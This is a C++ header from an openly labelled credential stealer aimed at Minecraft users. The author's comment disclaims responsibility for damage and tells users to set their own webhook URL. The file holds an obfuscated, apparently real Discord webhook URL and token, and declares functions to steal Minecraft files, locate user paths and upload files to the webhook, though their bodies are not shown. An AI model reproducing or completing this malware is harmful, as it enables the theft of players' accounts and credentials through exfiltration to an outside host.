/*

//===================================================//

this stealer was coded by itosted / juvee <--- https://github.com/zjuvee
you can use this code, but i dont take any responsibility for any damage caused.

remember to change the webhook url in the includes/MinecraftStealer.hpp file

pd: give me credits if you use this code in your project. <---- please, dont copy pasted and remove the name

//===================================================//
*/

#include <iostream>
#include <filesystem>
#include <fstream>
#include <Windows.h>
#include <string>
#include <winhttp.h>
#include <cstdlib>
#include "BLProcess.hpp"
#include <unordered_map>
#include <map>

#pragma comment(lib, "winhttp.lib")

namespace fs = std::filesystem;

/*

HERE YOU NEED TO CHANGE THE WEBHOOK URL

the format is: ----> api/webhooks/shitshitshitshitshitshitshit

*/

static std::string webhookURL = (xorstr_("api/webhooks/1245578635809914930/HSQURowA8tkGiLQB7TY3_KU1yS1yOQfY32g6Wt2d24y1-wM9fniMipw7VIMDvIp-J2yX"));

class Minecraft {
public:
	static void stealMinecraft();
	static char* userPathFinder();
	//static void createDirectories();
	//static void sendNonEmptyFiles(const std::map<std::filesystem::path, std::string>& fileMappings, const std::string& webhookURL);
	static void sendMessageToWebhook(const std::string& message, const std::string& webhookURL, const std::string& newName, const std::string& newAvatarURL);
	static void sendFileToWebhook(const std::string& filePath, const std::string& webhookURL, const std::string& newName, const std::string& newAvatarURL);
	static std::string getFileName(const std::filesystem::path& filePath);
	
	static std::string newName;
	static std::string newAvatarURL;

};
